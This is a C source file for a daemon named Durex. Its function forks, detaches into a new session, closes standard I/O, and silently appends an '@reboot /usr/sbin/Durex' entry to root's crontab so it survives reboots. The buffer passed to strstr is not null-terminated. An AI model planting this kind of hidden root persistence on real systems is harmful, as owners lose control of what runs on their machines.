#include "durex.h"

extern t_daemon		g_durex;

/*
** ***********************************************************************
** NAME
**		daemonize
**
** DESCRIPTION
**		Fork the parent process, request a new SID and close standard
**		inputs / outputs.
**
** RETURN VALUE
**		On success 0 is returned, -1 on error.
**
** ***********************************************************************
*/

void	daemonize(void)
{
	pid_t			pid;
	int				fd;
	char			*buf;
	struct stat		st;
	char			tmp[64] = { '\0' };

	daemon_report(LOG_INFO, "Daemonizing Durex...");

	/*
	** The user must be root to launch Durex
	*/
	if (geteuid() != 0)
	{
		daemon_report(LOG_ERROR, "Unable to start daemon. Not root user.");
		exit(EXIT_FAILURE);
	}

	/*
	** Fork the main process and close the parent since we will
	** request a new session ID afterwards
	*/
	pid = fork();
	if (pid < 0)
	{
		daemon_report(LOG_ERROR, "Durex process fork failed.");
		exit(EXIT_FAILURE);
	}
	else if (pid > 0)
		exit(EXIT_SUCCESS);

	g_durex.pid = getpid();
	sprintf(tmp, "Daemon has PID : %d", g_durex.pid);
	daemon_report(LOG_INFO, tmp);

	/*
	** Calling setsid() makes this process the session leader for
	** a new process group.
	*/
	daemon_report(LOG_INFO, "Requesting new process group...");
	if (setsid() < 0)
	{
		daemon_report(LOG_ERROR, "Unable to get a new process group.");
		exit(EXIT_FAILURE);
	}
	else
		daemon_report(LOG_INFO, "New process group obtained.");

	/*
	** Reset master file umask in case it has been altered
	*/
	daemon_report(LOG_INFO, "Changing file mask to 0...");
	umask(0);
	daemon_report(LOG_INFO, "File mask changed.");

	/*
	** Change working directory to root to make sure to be into a
	** directory that is not likely to be removed from the FS
	*/
	daemon_report(LOG_INFO, "Changing working directory to root...");
	if (chdir("/") < 0)
	{
		daemon_report(LOG_ERROR, "Unable to move to root directory");
		exit(EXIT_FAILURE);
	}
	else
		daemon_report(LOG_INFO, "Working directory changed.");

	/*
	** Close standard I/O as the daemon is running in background
	*/
	daemon_report(LOG_INFO, "Closing standard I/O...");
	if (close(STDIN_FILENO) == -1)
	{
		daemon_report(LOG_ERROR, "Unable to close stdin.");
		exit(EXIT_FAILURE);
	}
	if (close(STDOUT_FILENO) == -1)
	{
		daemon_report(LOG_ERROR, "Unable to close stdout");
		exit(EXIT_FAILURE);
	}
	if (close(STDERR_FILENO) == -1)
	{
		daemon_report(LOG_ERROR, "Unable to close stderr");
		exit(EXIT_FAILURE);
	}
	daemon_report(LOG_INFO, "Standard I/O closed.");
	daemon_report(LOG_INFO, "Daemon running.");

	/*
	** Add daemon as cron for automatic OS reboot startup
	*/
	daemon_report(LOG_INFO, "Setting up daemon as cron on OS startup...");
	if ((fd = open("/var/spool/cron/crontabs/root", O_RDWR | O_CREAT, 0600)) == -1)
	{
		daemon_report(LOG_ERROR, "Unable to open crontab.");
		return ;
	}
	daemon_report(LOG_INFO, "Crontab opened. Searching for daemon crontab event...");

	/*
	** Check if event is not already listed in crontab
	*/
	if (fstat(fd, &st) == -1)
	{
		daemon_report(LOG_ERROR, "Unable to fstat crontab. Aborting.");
		close(fd);
		return ;
	}
	if ((buf = (char *)malloc(sizeof(char) * st.st_size)) == NULL)
	{
		daemon_report(LOG_ERROR, "Unable to map crontab. Aborting.");
		close(fd);
		return ;
	}
	read(fd, buf, st.st_size);
	if (strstr(buf, "@reboot /usr/sbin/Durex") != NULL)
	{
		daemon_report(LOG_ERROR, "Daemon crontab event exists. Aborting.");
		free(buf);
		close(fd);
		return ;
	}
	free(buf);

	/*
	** Add event to crontab
	*/
	daemon_report(LOG_INFO, "Daemon crontab event not found. Adding it to crontab...");
	lseek(fd, 0, SEEK_END);
	write(fd, "@reboot /usr/sbin/Durex\n", 24);
	close(fd);
	daemon_report(LOG_INFO, "Daemon crontab event added.");
}
